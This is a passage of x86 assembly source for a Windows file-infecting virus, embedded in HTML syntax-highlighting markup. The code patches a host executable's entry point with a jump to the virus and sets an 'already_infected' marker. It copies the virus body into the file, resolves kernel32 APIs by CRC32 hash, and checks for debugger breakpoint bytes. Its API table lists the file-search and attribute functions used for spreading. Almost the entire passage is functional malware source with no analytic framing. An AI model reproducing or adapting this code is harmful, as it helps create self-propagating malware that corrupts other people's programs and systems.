    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">    </span><span class="sc1">;build JMP LARGE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;VIRUS_ADDRESS</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">    </span><span class="sc1">;set the flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_MinorLinkerVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
                    </span><span class="sc1">;set already_infected mark</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get the start of virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;number of DWORDs</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">           </span><span class="sc1">;move virus to file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;restore saved bytes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigBytes</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;restore the pointer to EP</span><span class="sc0">
</span><span class="sc5">endInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">is_null</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;zero flag</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;load byte</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">;is it NULL?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n1_null</span><span class="sc0">         </span><span class="sc1">;nope</span><span class="sc0">
</span><span class="sc5">null_ok</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;yeah, set flag</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">n1_null</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">         </span><span class="sc1">;is it NOP?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">null_ok</span><span class="sc0">          </span><span class="sc1">;nope</span><span class="sc0">
</span><span class="sc5">n2_null</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">            </span><span class="sc1">;is it INT 3?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">null_ok</span><span class="sc0">          </span><span class="sc1">;yeah, set flag and quit</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;nope, quit</span><span class="sc0">

</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;procedure for getting K32 base address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get return address</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffff0000h</span><span class="sc0">     </span><span class="sc1">;get only high address</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_k32</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;setup SEH frame</span><span class="sc0">
</span><span class="sc5">try_k32</span><span class="sc4">:</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get two bytes</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;negate them</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">       </span><span class="sc1">;is it MZ header?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_k32</span><span class="sc0">           </span><span class="sc1">;no, move to next address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get pointer to PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;normalize it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get four bytes</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;negate them</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">       </span><span class="sc1">;is it PE header?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g_k32</span><span class="sc0">            </span><span class="sc1">;yeah, we got K32 base</span><span class="sc0">
</span><span class="sc5">n_k32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1000h</span><span class="sc0">         </span><span class="sc1">;nope, move to next address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">try_k32</span><span class="sc0">         </span><span class="sc1">;and try to find base again</span><span class="sc0">
</span><span class="sc5">end_k32</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;not found, set flag then</span><span class="sc0">
</span><span class="sc5">g_k32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">get_apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crc32s</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get CRC32 values of APIs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_apis</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;where to store API addresses</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">crc32c</span><span class="sc0">                 </span><span class="sc1">;how many APIs do we need?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">g_apis</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;save K32 base</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_gpa</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;move to PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_gpa</span><span class="sc0">               </span><span class="sc1">;quit if no exports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;get address of export table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of API names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of API names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;save CRC32 to stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">APIname</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;get base</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;move to API name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">              </span><span class="sc1">;go to the end of string</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get string size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;move it to EDI</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;restore address of API name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">          </span><span class="sc1">;calculate CRC32 of API name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;is it right API?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g_name</span><span class="sc0">           </span><span class="sc1">;yeah, we got it</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">APIname</span><span class="sc0">            </span><span class="sc1">;and search for next API name</span><span class="sc0">
</span><span class="sc5">end_gpa</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;set flag</span><span class="sc0">
</span><span class="sc5">ok_gpa</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save value to stack</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">q_gpa</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;move to next CRC32</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">g_apis</span><span class="sc0">         </span><span class="sc1">;search for API addresses in a loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">q_gpa</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
</span><span class="sc5">g_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">end_gpa</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;base of K32</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of API functions</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get API function address</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">           </span><span class="sc1">;we got address of API in EAX</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_gpa</span><span class="sc0">          </span><span class="sc1">;quit</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;procedure to calculate CRC32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   
        </span><span class="sc6">lodsb</span><span class="sc0">          
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_GetTickCount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;1:2 possibility</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is it ZERO?</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;API's CRC32's</span><span class="sc0">
</span><span class="sc5">crc32s</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AE17EBEFh</span><span class="sc0">      </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AA700106h</span><span class="sc0">      </span><span class="sc1">;FindNextFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C200BE21h</span><span class="sc0">      </span><span class="sc1">;FindClose</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03C19E536h</span><span class="sc0">      </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04B2A3E7Dh</span><span class="sc0">      </span><span class="sc1">;SetFileTime</span><span class="sc0">
